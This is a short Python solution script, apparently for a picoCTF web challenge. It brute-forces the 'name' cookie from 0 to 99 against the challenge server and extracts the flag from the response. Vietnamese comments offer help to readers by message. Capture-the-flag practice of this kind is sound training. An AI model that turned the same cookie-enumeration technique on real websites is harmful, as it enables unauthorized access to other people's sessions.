import requests
URL="http://mercury.picoctf.net:54219/check"
for i in range (0,100):
    text=str(i)
    cookies={
        "name":text
    }
    r=requests.get(URL,cookies=cookies)
    result=r.text.split('<p style="text-align:center; font-size:30px;"><b>')[1].split('</b>')[0]
    print("Test cookie {} | result: {}".format(i,result))
    if 'I love' not in result:
        print(r.text.split("<code>")[1].split("</code>")[0])
        break
    # Bạn nào chưa hiểu thì có thể inbox tui để hỏi nhá UwU, rất vui khi chia sẻ kiến thức vớ vẩn của tui cho các bạn UwU.
    # Hãy làm 1 người văn minh khi nói chuyện
